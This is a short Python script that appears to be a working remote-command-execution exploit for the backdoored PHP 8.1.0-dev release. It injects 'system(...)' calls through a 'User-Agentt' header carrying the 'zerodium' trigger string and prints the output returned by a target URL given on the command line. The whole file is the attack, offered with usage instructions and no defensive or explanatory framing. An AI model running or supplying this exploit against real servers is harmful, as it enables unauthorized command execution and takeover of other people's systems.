import requests
import sys
#https://blog.csdn.net/zy15667076526/article/details/116447864
if len(sys.argv) < 2:
    print 'Usage: ' + sys.argv[0] + ' http://example.com ' + 'whoami'
    quit()
cmd = 'system("'+sys.argv[2]+'")'
vuln_site = sys.argv[1]
req = requests.get(vuln_site, headers={"User-Agentt":"zerodiumvar_dump("+cmd+");"})
#User-Agentt: zerodiumvar_dump(system("whoami"));
if req.status_code == 200:
    print cmd + ' was sent successfully, response:'
else: 
    print 'an error occured'
parse = req.text.split("<!DOCTYPE html>")[0]
print(parse.strip())


